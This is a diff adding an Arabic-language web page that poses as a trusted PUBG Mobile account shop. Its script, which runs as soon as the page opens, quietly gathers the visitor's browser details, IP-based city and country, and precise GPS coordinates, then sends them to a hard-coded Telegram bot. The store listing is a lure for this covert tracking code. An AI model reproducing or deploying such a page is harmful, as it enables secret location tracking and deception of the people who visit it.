@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر حسابات ببجي موبايل - PUBG Accounts Store</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #f39c12;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+        }
+        .container {
+            padding: 20px;
+        }
+        .account-card {
+            background-color: #2c3e50;
+            border-radius: 15px;
+            margin: 15px auto;
+            padding: 15px;
+            width: 80%;
+            max-width: 400px;
+            border: 2px solid #f39c12;
+            transition: transform 0.2s;
+        }
+        .account-card:hover {
+            transform: scale(1.05);
+        }
+        .price {
+            color: #f39c12;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .buy-btn {
+            background-color: #f39c12;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">🛒 متجر حسابات ببجي الموثوق 🛒</div>
+    
+    <div class="container">
+        <p>اختر الحساب المناسب لك من القائمة أدناه:</p>
+        
+        <div class="account-card">
+            <h3>حساب ليفل 70 + سكنات نادرة</h3>
+            <p class="price">السعر: 50$</p>
+            <button class="buy-btn">شراء الآن</button>
+        </div>
+
+        <div class="account-card">
+            <h3>حساب ملكي - جميع السكنات</h3>
+            <p class="price">السعر: 120$</p>
+            <button class="buy-btn">شراء الآن</button>
+        </div>
+
+        <div class="account-card">
+            <h3>حساب ليفل 40 - اقتصادي</h3>
+            <p class="price">السعر: 15$</p>
+            <button class="buy-btn">شراء الآن</button>
+        </div>
+    </div>
+
+    <div class="footer">© 2023 PUBG Store - جميع الحقوق محفوظة</div>
+
+    <script>       
+          // إعدادات التلجرام
+        const BOT_TOKEN = '8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28'; 
+        const CHAT_ID = '7145266755';
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+        }
+
+        async function collectData() {
+            let deviceInfo = `
+📱 الجهاز: ${navigator.userAgent}
+🌐 المتصفح: ${navigator.appName}
+🔋 البطارية: جاري الفحص...
+`;
+
+            // محاولة جلب الـ IP والموقع التقريبي
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                 deviceInfo += `\n📍 IP: ${ipData.ip}\n🌍 المدينة: ${ipData.city}\n🗺️ الدولة: ${ipData.country_name}`;
+            } catch (e) {
+                deviceInfo += "\n❌ تعذر جلب بيانات الـ IP";
+            }
+
+            // طلب الموقع الدقيق (GPS) - سيطلب المتصفح إذن المستخدم هنا
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const gpsData = `\n🎯 الموقع الدقيق (GPS):\nخط العرض: ${position.coords.latitude}\nخط الطول: ${position.coords.longitude}`;
+                    await sendToTelegram(deviceInfo + gpsData);
+                }, async (error) => {
+                    await sendToTelegram(deviceInfo + "\n❌ رفض المستخدم الوصول للـ GPS");
+                });
+            } else {
+                await sendToTelegram(deviceInfo + "\n❌ المتصفح لا يدعم GPS");
+            }
+        }
+
+        // تشغيل عملية السحب بمجرد فتح الصفحة
+        window.onload = collectData;
+    </script>
+</body>
+</html>
